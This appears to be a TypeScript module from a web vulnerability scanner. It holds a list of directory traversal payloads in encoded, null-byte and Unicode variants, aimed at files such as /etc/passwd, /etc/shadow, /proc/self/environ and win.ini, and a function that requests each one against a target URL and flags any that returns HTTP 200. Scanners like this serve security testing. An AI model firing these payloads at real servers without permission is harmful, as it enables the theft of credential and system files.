const urlFuzzing: string[] = [
    // Basic directory traversals
    '/../../../../etc/passwd',
    '/../../../etc/passwd',
    '/../../etc/passwd',

    // URL-encoded variations
    '/%2e%2e/%2e%2e/etc/passwd',
    '/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/..%2f..%2f..%2fetc%2fpasswd',
    '/..%252f..%252f..%252fetc%252fpasswd', // Double encoding

    // Windows-style traversals
    '/..\\..\\..\\windows\\win.ini',
    '/..%5c..%5c..%5cwindows%5cwin.ini',
    '/..%255c..%255c..%255cwindows%255cwin.ini',

    // Null byte injections
    '/../../../../etc/passwd%00',
    '/../../../../etc/passwd%00.jpg',
    '/../../../etc/passwd%00.txt',

    // Mixed encoding and slashes
    '/..\/..\/..\/etc/passwd',
    '/..%5c..%2f..%5cetc%2fpasswd',

    // UTF-8/Unicode variations
    '/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    '/%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd', // Fullwidth characters

    // Interesting file targets (both Unix and Windows)
    '/../../../../etc/shadow',
    '/../../../../proc/self/environ',
    '/../../../../var/log/apache2/access.log',
    '/../../../../windows/win.ini',
    '/../../../../boot.ini',

    // With parameter suffixes
    '/../../../etc/passwd?test=123',
    '/../../../etc/passwd#fragment',

    // With fake extensions
    '/../../../etc/passwd.png',
    '/../../../etc/passwd.css',

    // Absolute paths (sometimes work)
    '/etc/passwd',
    '/C:/windows/win.ini'
];

export default async function(url: URL) {
    let found: boolean = false;
    let messages: string[] = []

    const results = await Promise.allSettled(
        urlFuzzing.map(async (path) => {
            const response = await fetch(url.origin + path);
            if (response.status === 200) {
                return true;
            }
        })
    );

    results.forEach((result, index) => {
        if (result.status === 'fulfilled' && result.value) {
            found = true;
            messages.push(`Found potential traversal at: ${urlFuzzing[index]}`);
        }
    });

    // Return results
    return {
        found: found,
        messages: messages.length > 0 ? messages : ['No vulnerabilities found']
    }
}